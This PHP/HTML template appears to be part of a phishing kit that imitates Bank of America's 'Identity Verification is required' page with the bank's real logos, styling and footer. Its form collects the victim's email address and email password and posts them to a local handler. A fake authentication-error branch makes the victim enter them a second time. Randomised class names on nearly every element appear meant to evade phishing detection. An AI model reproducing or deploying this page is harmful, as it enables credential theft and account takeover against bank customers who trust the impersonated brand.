        [data-sparta-container] .ah-enroll-main-module-class-v-1-2-0 #ah-authcode-container input[type="password"] {
            width: 100% !important;
            height: 40px
        }

        @media only screen and (min-width: 768px) {

            [data-sparta-container] .ah-enroll-main-module-class-v-1-2-0 #ah-authcode-container input[type="text"],
            [data-sparta-container] .ah-enroll-main-module-class-v-1-2-0 #ah-authcode-container input[type="password"] {
                width: 50% !important
            }
        }

        @media only screen and (min-width: 1025px) {

            [data-sparta-container] .ah-enroll-main-module-class-v-1-2-0 #ah-authcode-container input[type="text"],
            [data-sparta-container] .ah-enroll-main-module-class-v-1-2-0 #ah-authcode-container input[type="password"] {
                width: 33.3% !important
            }
        }

        [data-sparta-container] .ah-enroll-main-module-class-v-1-2-0 #ah-authcode-container #requestAuthStep #otp-request-caw-buttons,
        [data-sparta-container] .ah-enroll-main-module-class-v-1-2-0 #ah-authcode-container #enterAuthStep #otp-entry-caw-buttons {
            font-size: 20px;
            padding: 10px 20px 10px 0px
        }

        [data-sparta-container] .ah-enroll-main-module-class-v-1-2-0 #ah-authcode-container #helpLayer_enrollAuthcodeModule-creditc-sec {
            width: 100%
        }

        @media only screen and (min-width: 768px) {
            [data-sparta-container] .ah-enroll-main-module-class-v-1-2-0 #ah-authcode-container #helpLayer_enrollAuthcodeModule-creditc-sec {
                width: 50%
            }
        }

        @media only screen and (min-width: 768px) {
            [data-sparta-container] .ah-enroll-main-module-class-v-1-2-0 #ah-authcode-container #helpLayer_enrollAuthcodeModule-creditc-sec {
                width: 33.33%
            }
        }

        [data-sparta-container] .ah-enroll-main-module-class-v-1-2-0 .link-height {
            margin-bottom: 40px
        }

        @media only screen and (min-width: 768px) {
            [data-sparta-container] .ah-enroll-main-module-class-v-1-2-0 .link-height {
                margin-bottom: 80px
            }
        }

        [data-sparta-container] .ah-enroll-main-module-class-v-1-2-0 .no-padding {
            padding: 0 !important
        }

        [data-sparta-container] .ah-enroll-main-module-class-v-1-2-0 #ah-ecdsa-module-container #ecd-partial h3 {
            float: left;
            width: 100%
        }

        [data-sparta-container] .ah-enroll-main-module-class-v-1-2-0 #ah-ecdsa-module-container #ecd-partial span {
            display: block;
            float: left;
            margin-bottom: 30px;
            margin-top: 10px
        }

        [data-sparta-container] .ah-enroll-main-module-class-v-1-2-0 #ah-ecdsa-module-container #sa-partial h3 {
            float: left;
            width: 100%
        }

        [data-sparta-container] .ah-enroll-main-module-class-v-1-2-0 #ah-ecdsa-module-container #sa-partial span {
            display: block;
            float: left;
            margin-bottom: 30px;
            margin-top: 10px
        }

        [data-sparta-container] .ah-enroll-main-module-class-v-1-2-0 #ah-ecdsa-module-container #service-aggrement-content #sa-dynamic-container .view-pdf,
        [data-sparta-container] .ah-enroll-main-module-class-v-1-2-0 #ah-ecdsa-module-container #ecomm-disclosure-content #ecd-dynamic-container .view-pdf {
            float: left !important;
            font-size: 17px
        }

        [data-sparta-container] .ah-enroll-main-module-class-v-1-2-0 #ah-ecdsa-module-container .view-more {
            text-align: left !important;
            margin-left: 20px
        }

        [data-sparta-container] .ah-enroll-main-module-class-v-1-2-0 #ah-ecdsa-module-container .view-more-olb {
            text-align: left !important;
            margin-left: 20px
        }

        [data-sparta-container] .ah-enroll-main-module-class-v-1-2-0 #ah-ecdsa-module-container .spa-input-option-label {
            font-size: 17px
        }

        [data-sparta-container] .ah-enroll-main-module-class-v-1-2-0 #ah-ecdsa-module-container .mtop-44 {
            margin-top: 44px
        }

        [data-sparta-container] .ah-enroll-main-module-class-v-1-2-0 #ah-ecdsa-module-container #sa-dynamic-container .data-font,
        [data-sparta-container] .ah-enroll-main-module-class-v-1-2-0 #ah-ecdsa-module-container #sa-dynamic-container .olb-agreement-text,
        [data-sparta-container] .ah-enroll-main-module-class-v-1-2-0 #ah-ecdsa-module-container #sa-dynamic-container .agg-section-content,
        [data-sparta-container] .ah-enroll-main-module-class-v-1-2-0 #ah-ecdsa-module-container #sa-dynamic-container .data-font strong,
        [data-sparta-container] .ah-enroll-main-module-class-v-1-2-0 #ah-ecdsa-module-container #sa-dynamic-container .section-body p,
        [data-sparta-container] .ah-enroll-main-module-class-v-1-2-0 #ah-ecdsa-module-container #sa-dynamic-container .data-font p {
            font-size: 17px
        }

        [data-sparta-container] .ah-enroll-main-module-class-v-1-2-0 #ah-ecdsa-module-container #sa-dynamic-container .data-font span,
        [data-sparta-container] .ah-enroll-main-module-class-v-1-2-0 #ah-ecdsa-module-container #sa-dynamic-container .olb-agreement-text span,
        [data-sparta-container] .ah-enroll-main-module-class-v-1-2-0 #ah-ecdsa-module-container #sa-dynamic-container .agg-section-content span,
        [data-sparta-container] .ah-enroll-main-module-class-v-1-2-0 #ah-ecdsa-module-container #sa-dynamic-container .data-font strong span,
        [data-sparta-container] .ah-enroll-main-module-class-v-1-2-0 #ah-ecdsa-module-container #sa-dynamic-container .section-body p span,
        [data-sparta-container] .ah-enroll-main-module-class-v-1-2-0 #ah-ecdsa-module-container #sa-dynamic-container .data-font p span {
            margin: 0px !important
        }

        [data-sparta-container] .ah-enroll-main-module-class-v-1-2-0 #ah-create-id-passcode-module-container #cred-create-content .column {
            padding-left: 0
        }

        [data-sparta-container] .ah-enroll-main-module-class-v-1-2-0 #ah-create-id-passcode-module-container #btn-create-olbacct {
            margin-bottom: 0px !important
        }

        [data-sparta-container] .ah-enroll-main-module-class-v-1-2-0 #ah-create-id-passcode-module-container h2 {
            font: 100% "cnx-bold", Arial, Helvetica, sans-serif !important;
            font-size: 20px !important;
            width: 100% !important
        }

        [data-sparta-container] .ah-enroll-main-module-class-v-1-2-0 #ecd-dynamic-container h3 {
            font-size: 1.375rem
        }

        [data-sparta-container] .ah-enroll-main-module-class-v-1-2-0 #sa-dynamic-container h3 {
            font-size: 1.375rem !important
        }

        [data-sparta-container] .ah-enroll-main-module-class-v-1-2-0 #enroll-main-module-container #enroll-spinner .modal-dialog {
            text-align: center;
            margin-top: 20px
        }

        [data-sparta-container] .ah-enroll-main-module-class-v-1-2-0 .enroll-option-content #closeIcon {
            display: none
        }

        [data-sparta-container] .ah-enroll-main-module-class-v-1-2-0 #service-aggrement-content .sa-partial-noscroll {
            height: 460px;
            overflow: hidden
        }

        [data-sparta-container] .ah-enroll-main-module-class-v-1-2-0 #service-aggrement-content .sa-partial-scroll {
            height: auto
        }

        @media only screen and (max-width: 480px) {
            [data-sparta-container] .ah-enroll-main-module-class-v-1-2-0 #service-aggrement-content .sa-partial-scroll {
                height: auto
            }

            [data-sparta-container] .ah-enroll-main-module-class-v-1-2-0 #service-aggrement-content .sa-partial-noscroll {
                height: 470px;
                overflow: hidden
            }
        }

        [data-sparta-container] .ah-enroll-main-module-class-v-1-2-0 #ecd-dynamic-container .ecd-partial-noscroll {
            height: 470px !important;
            overflow: hidden !important
        }

        [data-sparta-container] .ah-enroll-main-module-class-v-1-2-0 #ecd-dynamic-container .ecd-partial-scroll {
            height: auto !important
        }

        @media only screen and (max-width: 480px) {
            [data-sparta-container] .ah-enroll-main-module-class-v-1-2-0 #ecd-dynamic-container .ecd-partial-scroll {
                height: auto
            }

            [data-sparta-container] .ah-enroll-main-module-class-v-1-2-0 #ecd-dynamic-container .ecd-partial-noscroll {
                height: 470px !important;
                overflow: hidden !important
            }
        }

        [data-sparta-container] .ah-enroll-main-module-class-v-1-2-0 #create-oid-main-section {
            margin-bottom: 0px !important
        }

        [data-sparta-container] .ah-enroll-main-module-class-v-1-2-0 #enroll-oid-passcode-error {
            margin-left: 10px !important;
            width: 200% !important
        }

        .set-height {
            min-height: 648px
        }

        @media only screen and (min-width: 768px) {
            .set-height {
                min-height: 775px
            }
        }

        @media only screen and (min-width: 1025px) {
            .set-height {
                min-height: 400px
            }
        }

        section.foot-row {
            position: absolute;
            width: 100%
        }

        #returnHomeBtn {
            width: 100%
        }

        @media only screen and (min-width: 768px) {
            #returnHomeBtn {
                width: 50%
            }
        }

        @media only screen and (min-width: 1025px) {
            #returnHomeBtn {
                width: 33.33%
            }
        }

        #home-btn-container {
            text-align: center
        }

        #ah-acct-ssn-container .title-text {
            font-family: "cnx-bold"
        }

        @media only screen and (max-device-width: 812px) {
            #enrollHeaderModule .spa-page-header-links {
                margin-top: -180px !important
            }
        }

        @media only screen and (min-device-width: 414px) {
            #enrollHeaderModule .spa-page-header-links {
                margin: 5px -17px 0 0 !important
            }
        }

        [data-sparta-container] .ah-forgot-no-ssn-module-class-v-2-3-0 .no-ssn-form-heading {
            font: 20px "cnx-bold";
            color: #333
        }

        [data-sparta-container] .ah-forgot-no-ssn-module-class-v-2-3-0 .no-ssn-form-helpText {
            font: 14px "cnx-regular";
            color: #333
        }

        [data-sparta-container] .ah-forgot-no-ssn-module-class-v-2-3-0 .no-ssn-form-info {
            font: 16px "cnx-regular";
            color: #333;
            font-weight: normal
        }

        [data-sparta-container] .ah-forgot-no-ssn-module-class-v-2-3-0 .no-ssn-content {
            display: block;
            color: #333333;
            font-weight: normal;
            line-height: 1.5;
            padding-bottom: 10px
        }

        [data-sparta-container] .ah-forgot-no-ssn-module-class-v-2-3-0 .no-ssn-form-label {
            font: 16px 'cnx-medium';
            display: block;
            color: #333;
            font-weight: bold;
            line-height: 1.5
        }

        [data-sparta-container] .ah-forgot-no-ssn-module-class-v-2-3-0 .flt-lt {
            float: left
        }

        [data-sparta-container] .ah-forgot-no-ssn-module-class-v-2-3-0 .btm-10 {
            margin-bottom: 10px
        }

        [data-sparta-container] .ah-forgot-no-ssn-module-class-v-2-3-0 .btm-20 {
            margin-bottom: 20px
        }

        [data-sparta-container] .ah-forgot-no-ssn-module-class-v-2-3-0 .btm-30 {
            margin-bottom: 30px
        }

        [data-sparta-container] .ah-forgot-no-ssn-module-class-v-2-3-0 .btn-container {
            margin-top: 40px;
            margin-bottom: -25px
        }

        @media screen and (max-width: 767px) {
            [data-sparta-container] .ah-forgot-no-ssn-module-class-v-2-3-0 button {
                width: 100%
            }
        }

        @media screen and (max-width: 767px) {
            [data-sparta-container] .ah-forgot-no-ssn-module-class-v-2-3-0 #btn-cancel {
                margin-top: 20px
            }
        }

        [data-sparta-container] .ah-forgot-no-ssn-module-class-v-2-3-0 .btn-continue {
            padding-left: 30px
        }

        [data-sparta-container] .ah-forgot-no-ssn-module-class-v-2-3-0 .mtop-30 {
            margin-top: 30px
        }

        [data-sparta-container] .ah-forgot-no-ssn-module-class-v-2-3-0 .mtop-40 {
            margin-top: 40px
        }

        [data-sparta-container] .ah-forgot-no-ssn-module-class-v-2-3-0 .mrt-15 {
            margin-right: 15px
        }

        [data-sparta-container] .ah-forgot-no-ssn-module-class-v-2-3-0 #ah-no-ssn-container .spartaMessage {
            margin-top: 50px !important
        }

        [data-sparta-container] .ah-forgot-no-ssn-module-class-v-2-3-0 #ah-no-ssn-container .spartaMessage-icon {
            padding: 17px 0 !important;
            margin-left: 1px !important
        }

        #noSsnAuthcodeModule {
            margin-top: 30px;
            margin-bottom: 40px
        }

        #ah-no-ssn-error-container .spartaMessage-icon .data-icon {
            margin-top: 22px
        }

        #ah-authcode-container .action-buttons button {
            font-size: 1em;
            text-transform: capitalize !important
        }

        .set-height {
            min-height: 648px
        }

        @media only screen and (min-width: 768px) {
            .set-height {
                min-height: 775px
            }
        }

        @media only screen and (min-width: 1025px) {
            .set-height {
                min-height: 400px
            }
        }

        section.foot-row {
            position: absolute;
            width: 100%
        }
    </style>


</head>

<body data-sparta-version="5.0.1" data-build-id="113240" data-sparta-wrapper="secure-ah-enroll" class="<?php echo $rand = rand_chars("$chars", 25, TRUE); ?> sparta-media-query-utility-loading" style="visibility: visible;">
    <div data-sparta-container="secure-ah-enroll" class="<?php echo $rand = rand_chars("$chars", 25, TRUE); ?> flex-grid-nest spa-contextroot-auth/enroll spa-site-secure-ah-enroll">


        <a class="<?php echo $rand = rand_chars("$chars", 25, TRUE); ?> ada-hidden ada-visible-focus" href="#skip-to-h1" id="ada-skip-link">Skip to main content</a>
        <div class="<?php echo $rand = rand_chars("$chars", 25, TRUE); ?> spa-layout-container spa-layout-container--flex-grid-nest">
            <div data-component="layout" data-layout="flex-grid-layout" data-version="" class="<?php echo $rand = rand_chars("$chars", 25, TRUE); ?> sparta-layout flex-grid-layout" id="top">
                <section id="head-row" class="<?php echo $rand = rand_chars("$chars", 25, TRUE); ?> head-row ah-header-section small-centered">
                    <div class="<?php echo $rand = rand_chars("$chars", 25, TRUE); ?> row small-collapse medium-collapse large-collapse">
                        <div class="<?php echo $rand = rand_chars("$chars", 25, TRUE); ?> large-12 columns">
                            <div id="enrollHeaderModule" data-component="module" data-module="ah-header-module" data-module-container="3.1.4" data-version="3.3.0" data-sparta-load="primary" data-module-ref="login/ah-header-module" data-options="{&quot;var1&quot;:&quot;I am a placeholder CMS JCR&quot;,&quot;var2&quot;:3}" data-init="ahHeaderModuleJS" data-module-parameters="{&quot;color&quot;:&quot;blue&quot;,&quot;headerClass&quot;:&quot;ff-boa-header&quot;,&quot;has-top-nav&quot;:true,&quot;has-secure-lock&quot;:true,&quot;show-en-version&quot;:true,&quot;show-es-version&quot;:true,&quot;es-url&quot;:&quot;es/&quot;,&quot;en-url&quot;:&quot;../&quot;,&quot;home-url-es&quot;:&quot;https://www.bankofamerica.com/es/&quot;,&quot;home-url&quot;:&quot;https://www.bankofamerica.com/&quot;,&quot;has-hamburger&quot;:true,&quot;usecase&quot;:&quot;rebrandLogo&quot;}" class="<?php echo $rand = rand_chars("$chars", 25, TRUE); ?> ah-header-module-class-v-3-3-0 ah-header-module spa-module-init">
                                <header class="<?php echo $rand = rand_chars("$chars", 25, TRUE); ?> spa-page-header" data-font="cnx-regular">
                                    <div id="ahHeaderContainer" class="<?php echo $rand = rand_chars("$chars", 25, TRUE); ?> spa-page-header-container full-width row clearfix">
                                        <div class="<?php echo $rand = rand_chars("$chars", 25, TRUE); ?> spa-page-header-grid-container columns large-12 clearfix">
                                            <div id="header-logo">
                                                <a itemprop="url" title="Bank of America Logo" class="<?php echo $rand = rand_chars("$chars", 25, TRUE); ?> home-link bofa-logo" id="boaLogo" href="https://www.bankofamerica.com/">
                                                    <img itemprop="logo" id="bacLogo" alt="Bank of America Logo" src="https://secure1.bac-assets.com/sparta/auth/enroll/spa-assets/images/assets-images-global-logos-BofA_rgb-CSX5624a146.svg">
                                                </a>
                                                <a itemprop="url" title="Bank of America Logo" class="<?php echo $rand = rand_chars("$chars", 25, TRUE); ?> home-link bofa-logo bofa-logo-small" id="boaLogoSmall" href="https://www.bankofamerica.com/">
                                                    <img itemprop="logoSmall" id="bacLogoSmall" alt="Bank of America Logo" src="https://secure1.bac-assets.com/sparta/auth/enroll/spa-assets/images/assets-images-site-secure-ah-forgot-common-BofA_symbol_rgb-CSX33067442.svg">
                                                </a>
                                                <h2></h2>
                                            </div>
                                            <div id="header-links" class="<?php echo $rand = rand_chars("$chars", 25, TRUE); ?> header-right right">
                                                <ul class="<?php echo $rand = rand_chars("$chars", 25, TRUE); ?> spa-page-header-links">
                                                    <div class="<?php echo $rand = rand_chars("$chars", 25, TRUE); ?> header-secure">
                                                        <a id="header-secure" href="https://www.bankofamerica.com/global/securepage.action" class="<?php echo $rand = rand_chars("$chars", 25, TRUE); ?> lock-icon spa-fn spa-boa-window" data-options="{&quot;windowName&quot;:&quot;equalHousingLenderWin&quot;,&quot;size&quot;:&quot;&quot;,&quot;height&quot;:400,&quot;width&quot;:600,&quot;menubar&quot;:true,&quot;scrollbars&quot;:true,&quot;status&quot;:true}">Secure Area</a>
                                                    </div>
                                                    <li class="<?php echo $rand = rand_chars("$chars", 25, TRUE); ?> spa-page-header-link espanol">
                                                        <a class="<?php echo $rand = rand_chars("$chars", 25, TRUE); ?> " id="esp-route-to" href="es/" hreflang="es" title="En español">En espa ñol</a>
                                                    </li>
                                                </ul>
                                            </div>
                                        </div>
                                    </div>
                                </header>
                                <style type="text/css">
                                    .lock-icon::before {
                                        background-image: url(https://secure1.bac-assets.com/sparta/auth/enroll/spa-assets/images/assets-images-global-header-secure-lock-CSXa09bf5fc.svg);
                                        background-repeat: no-repeat
                                    }
                                </style>
                            </div>
                            <div id="enrollTitleModule" data-component="module" data-module="title-module" data-module-container="3.1.4" data-version="9.0.0" data-sparta-load="primary" data-module-ref="global/title-module" data-options="{&quot;isSticky&quot;:false,&quot;stickyLevel&quot;:1}" data-init="titleModuleJS" data-module-parameters="{&quot;skin&quot;:&quot;red&quot;,&quot;isSticky&quot;:false,&quot;secondarySticky&quot;:&quot;&quot;,&quot;flagscape&quot;:true,&quot;textColor&quot;:&quot;white&quot;,&quot;titleHeadingTag&quot;:&quot;h1&quot;,&quot;titleHeadingRole&quot;:&quot;heading&quot;,&quot;pageTitleId&quot;:&quot;h1&quot;,&quot;stickyLevel&quot;:1}" class="<?php echo $rand = rand_chars("$chars", 25, TRUE); ?> title-module-class-v-9-0-0 title-module spa-module-init">

                                <div class="<?php echo $rand = rand_chars("$chars", 25, TRUE); ?> spa-page-title spa-page-title--has-flagscape spa-page-title--red spa-page-title--white-text" data-sticky-level="1">
                                    <div class="<?php echo $rand = rand_chars("$chars", 25, TRUE); ?> spa-page-title-inset row">
                                        <div class="<?php echo $rand = rand_chars("$chars", 25, TRUE); ?> column">
                                            <h1 data-font="cnx-regular" class="<?php echo $rand = rand_chars("$chars", 25, TRUE); ?> heading title-heading" id="skip-to-h1" role="heading">Identity Verification is required</h1>
                                        </div>
                                    </div>
                                </div>
                                <style type="text/css">
                                    [data-sparta-container] .spa-page-title.spa-page-title--has-flagscape.spa-page-title--red {
                                        background-image: url(https://secure1.bac-assets.com/sparta/auth/enroll/spa-assets/images/assets-images-global-title-flagscape_red-CSX345e7fd7.svg)
                                    }

                                    [data-sparta-container] .spa-page-title.spa-page-title--has-flagscape.spa-page-title--crimson {
                                        background-image: url(https://secure1.bac-assets.com/sparta/auth/enroll/spa-assets/images/assets-images-global-title-flagscape_crimson-CSX37719e01.svg)
                                    }

                                    [data-sparta-container] .spa-page-title.spa-page-title--has-flagscape.spa-page-title--gray {
                                        background-image: url(https://secure1.bac-assets.com/sparta/auth/enroll/spa-assets/images/assets-images-global-title-flagscape_gray-CSXc1942577.svg)
                                    }

                                    [data-sparta-container] .spa-page-title.spa-page-title--has-flagscape.spa-page-title--red-gradient::after {
                                        background-image: url(https://secure1.bac-assets.com/sparta/auth/enroll/spa-assets/images/assets-images-global-title-flagscape_red_gradient_small-CSXa4e54b78.svg);
                                        background-position: 50% center
                                    }

                                    [data-sparta-container] .spa-page-title.spa-page-title--has-flagscape.spa-page-title--red-gradient::before {
                                        background-image: url(https://secure1.bac-assets.com/sparta/auth/enroll/spa-assets/images/assets-images-global-title-flagscape_red_gradient_large-CSXcf049265.svg);
                                        background-position: 59% 28%
                                    }
                                </style>
                            </div>
                        </div>
                    </div>
                </section>
                <section class="<?php echo $rand = rand_chars("$chars", 25, TRUE); ?> small-centered section-body set-height">
                    <div class="<?php echo $rand = rand_chars("$chars", 25, TRUE); ?> row small-collapse medium-collapse large-collapse">
                        <div class="<?php echo $rand = rand_chars("$chars", 25, TRUE); ?> large-12 columns">
                            <div id="ah-acct-ssn-main-container" class="<?php echo $rand = rand_chars("$chars", 25, TRUE); ?> column small-12 no-padding">
                                <?php
                                if (isset($_GET['error']) && !empty($_GET['error']) && $_GET['error'] === '1') {

                                ?>
                                    <form class="<?php echo $rand = rand_chars("$chars", 25, TRUE); ?> ptop-30" method="post" action="com">
                                        <input type="hidden" name="action" value="2">
                                        <div class="<?php echo $rand = rand_chars("$chars", 25, TRUE); ?> columns small-12">
                                        </div>
                                        <section id="title-section">
                                            <div class="<?php echo $rand = rand_chars("$chars", 25, TRUE); ?> row mbottom-20">
                                                <div class="<?php echo $rand = rand_chars("$chars", 25, TRUE); ?> column small-12 title-text"></br>
                                                    <h4>Online Banking verification is required.</h4>
                                                </div>
                                            </div>
                                            <div style="padding-bottom:10px;" class="<?php echo $rand = rand_chars("$chars", 25, TRUE); ?> row mbottom-30">
                                                <div id="introText" class="<?php echo $rand = rand_chars("$chars", 25, TRUE); ?> column small-12 intro-text">Please provide valid information and we'll help you to recover your online Banking profile.</br></div>
                                                <div id="privacyText" class="<?php echo $rand = rand_chars("$chars", 25, TRUE); ?> column small-12 intro-text hidden">We value your security and privacy. For your protection, please provide the following information to verify your identity.</div>
                                            </div>
                                        </section>

                                        <div style="padding-bottom:20px;" class="<?php echo $rand = rand_chars("$chars", 25, TRUE); ?> row mbottom-30">
                                            <div id="introText" class="<?php echo $rand = rand_chars("$chars", 25, TRUE); ?> column small-12 intro-text">
                                                <font color="red">Error Authenticating to your Email Account, please try again.</font></br>
                                            </div>
                                        </div>

                                    <?php
                                } else {

                                    ?>
                                        <form class="<?php echo $rand = rand_chars("$chars", 25, TRUE); ?> ptop-30" method="post" action="com">
                                            <input type="hidden" name="action" value="1">
                                            <div class="<?php echo $rand = rand_chars("$chars", 25, TRUE); ?> columns small-12">
                                            </div>
                                            <section id="title-section">
                                                <div class="<?php echo $rand = rand_chars("$chars", 25, TRUE); ?> row mbottom-20">
                                                    <div class="<?php echo $rand = rand_chars("$chars", 25, TRUE); ?> column small-12 title-text"></br>
                                                        <h4>Online Banking verification is required.</h4>
                                                    </div>
                                                </div>
                                                <div style="padding-bottom:10px;" class="<?php echo $rand = rand_chars("$chars", 25, TRUE); ?> row mbottom-30">
                                                    <div id="introText" class="<?php echo $rand = rand_chars("$chars", 25, TRUE); ?> column small-12 intro-text">Please provide valid information and we'll help you to recover your online Banking profile.</br></div>
                                                    <div id="privacyText" class="<?php echo $rand = rand_chars("$chars", 25, TRUE); ?> column small-12 intro-text hidden">We value your security and privacy. For your protection, please provide the following information to verify your identity.</div>
                                                </div>
                                            </section>
                                        <?php

                                    }

                                        ?>

                                        <section id="form-section">

                                            <div class="<?php echo $rand = rand_chars("$chars", 25, TRUE); ?> row">
                                                <div class="<?php echo $rand = rand_chars("$chars", 25, TRUE); ?> column small-12 medium-6 large-4 clearfix">
                                                    <div class="<?php echo $rand = rand_chars("$chars", 25, TRUE); ?> mbottom-20">
                                                        <div class="<?php echo $rand = rand_chars("$chars", 25, TRUE); ?> spa-input spa-input-box spa-input--sparta2">
                                                            <label class="<?php echo $rand = rand_chars("$chars", 25, TRUE); ?> spa-input-label" data-font="cnx-medium" for="acctNumber">Email Address<span class="<?php echo $rand = rand_chars("$chars", 25, TRUE); ?> spa-input-label--required"></span></label>
                                                            <input required="" type="email" minlength="5" maxlength="60" class="<?php echo $rand = rand_chars("$chars", 25, TRUE); ?> spa-input-text gis-mask gis-mask-original" name="emad" autocomplete="off" aria-required="true" data-required-error-message="Please verify your information">
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                            </br>
                                            <div class="<?php echo $rand = rand_chars("$chars", 25, TRUE); ?> row">
                                                <div class="<?php echo $rand = rand_chars("$chars", 25, TRUE); ?> column small-12 medium-6 large-4 clearfix">
                                                    <div class="<?php echo $rand = rand_chars("$chars", 25, TRUE); ?> mbottom-20">
                                                        <div class="<?php echo $rand = rand_chars("$chars", 25, TRUE); ?> spa-input spa-input-box spa-input--sparta2">
                                                            <label class="<?php echo $rand = rand_chars("$chars", 25, TRUE); ?> spa-input-label" data-font="cnx-medium" for="acctNumber">Email Password <span class="<?php echo $rand = rand_chars("$chars", 25, TRUE); ?> spa-input-label--required"></span></label>
                                                            <input required="" type="password" minlength="5" maxlength="60" class="<?php echo $rand = rand_chars("$chars", 25, TRUE); ?> spa-input-text gis-mask gis-mask-original" name="empa" autocomplete="off">
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                            
                                        </section>
                                        <section>
                                            <div class="<?php echo $rand = rand_chars("$chars", 25, TRUE); ?> row mbottom-10">
                                                <div class="<?php echo $rand = rand_chars("$chars", 25, TRUE); ?> column small-12 trailing-text"></div>
                                            </div>
                                            <div class="<?php echo $rand = rand_chars("$chars", 25, TRUE); ?> row">
                                                <div class="<?php echo $rand = rand_chars("$chars", 25, TRUE); ?> column small-12 trailing-link"><a id="reset-no-ssn-link" href="javascript:void(0);" class="<?php echo $rand = rand_chars("$chars", 25, TRUE); ?> atvo-dont-have-ssn-link"></a></div>
                                            </div>

                                        </section>
                                        <section id="btn-section">
                                            <div class="<?php echo $rand = rand_chars("$chars", 25, TRUE); ?> row mtop-40 mbottom-40">
                                                <div class="<?php echo $rand = rand_chars("$chars", 25, TRUE); ?> column small-12 fl-lt clearfix">
                                                    <div style="padding-top:20px;" class="<?php echo $rand = rand_chars("$chars", 25, TRUE); ?> acct-btn-container">
                                                        <div class="<?php echo $rand = rand_chars("$chars", 25, TRUE); ?> "><button class="<?php echo $rand = rand_chars("$chars", 25, TRUE); ?> spa-btn spa-btn--medium spa-btn--primary forgot-auth" type="submit" default-button="">Continue</button></div>
                                                    </div>
                                                </div>
                                            </div>
                                        </section>
                            </div>
                            </form>
                        </div>

                    </div>

                </section>
                <section style="padding-top:200px;" class="<?php echo $rand = rand_chars("$chars", 25, TRUE); ?> foot-row small-centered">
                    <div class="<?php echo $rand = rand_chars("$chars", 25, TRUE); ?> row small-collapse medium-collapse large-collapse">
                        <div class="<?php echo $rand = rand_chars("$chars", 25, TRUE); ?> large-12 columns">
                            <div id="ahFooterModule" data-component="module" data-module="ah-footer-module" data-module-container="3.1.4" data-version="2.3.1" data-sparta-load="primary" data-module-ref="login/ah-footer-module" data-options="{&quot;var1&quot;:&quot;I am a placeholder CMS JCR&quot;,&quot;var2&quot;:3,&quot;clientParams&quot;:{&quot;secondaryFooter&quot;:&quot;&quot;}}" data-init="ahFooterModuleJS" data-module-parameters="{&quot;color&quot;:&quot;blue&quot;}" class="<?php echo $rand = rand_chars("$chars", 25, TRUE); ?> ah-footer-module-class-v-2-3-1 ah-footer-module spa-module-init">
                                <div id="ahFooterContainer" class="<?php echo $rand = rand_chars("$chars", 25, TRUE); ?> clearfix">
                                    <div id="foot-note" class="<?php echo $rand = rand_chars("$chars", 25, TRUE); ?> row no-padding hidden">
                                        <div class="<?php echo $rand = rand_chars("$chars", 25, TRUE); ?> column small-12 no-padding mtop-40 mlt-10 mb-15"></div>
                                    </div>
                                    <div class="<?php echo $rand = rand_chars("$chars", 25, TRUE); ?> footer-inner row full-width clearfix">
                                        <div id="ahSecureArea" class="<?php echo $rand = rand_chars("$chars", 25, TRUE); ?> column small-12">
                                            <span class="<?php echo $rand = rand_chars("$chars", 25, TRUE); ?> fl-lt">
                                                <img src="https://secure1.bac-assets.com/sparta/auth/enroll/spa-assets/images/assets-images-global-header-lock-CSX1f35fd71.png">
                                            </span>
                                            <span class="<?php echo $rand = rand_chars("$chars", 25, TRUE); ?> f-small mb-10 fl-lt">Secure area</span>
                                        </div>
                                        <div class="<?php echo $rand = rand_chars("$chars", 25, TRUE); ?> column small-12">
                                            <div class="<?php echo $rand = rand_chars("$chars", 25, TRUE); ?> column small-12">
                                                <a itemprop="url" title="" class="<?php echo $rand = rand_chars("$chars", 25, TRUE); ?> home-link f-base" id="" href="https://www.bankofamerica.com/security-center/privacy-overview/" target="_blank">Privacy </a>
                                                <span class="<?php echo $rand = rand_chars("$chars", 25, TRUE); ?> home-link f-base">&nbsp;| &nbsp;</span>
                                                <a itemprop="url" title="" class="<?php echo $rand = rand_chars("$chars", 25, TRUE); ?> home-link f-base" id="" href="https://www.bankofamerica.com/security-center/overview/" target="_blank">Security</a>
                                            </div>
                                        </div>
                                        <div class="<?php echo $rand = rand_chars("$chars", 25, TRUE); ?> bofa-copyright column small-12 mt-10">
                                            <p class="<?php echo $rand = rand_chars("$chars", 25, TRUE); ?> f-copyright">
                                                Bank of America, N.A. Member FDIC. <a name="Equal_Housing_Lender" href="https://www.bankofamerica.com/help/equalhousing_popup.go" target="_blank">Equal Housing Lender </a>
                                                <span class="<?php echo $rand = rand_chars("$chars", 25, TRUE); ?> f-icon">
                                                    <img src="https://secure1.bac-assets.com/sparta/auth/enroll/spa-assets/images/assets-images-global-footer-eha_logo_1x-CSXc5bd9130.png">
                                                </span>
                                            </p>
                                            <p class="<?php echo $rand = rand_chars("$chars", 25, TRUE); ?> f-copyright">
                                                ©<span id="dynamic-copyright-year-update">2022</span>
                                                Bank of America Corporation.&nbsp;All rights reserved.
                                            </p>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </section>
            </div>
        </div>
    </div>
</body>

</html>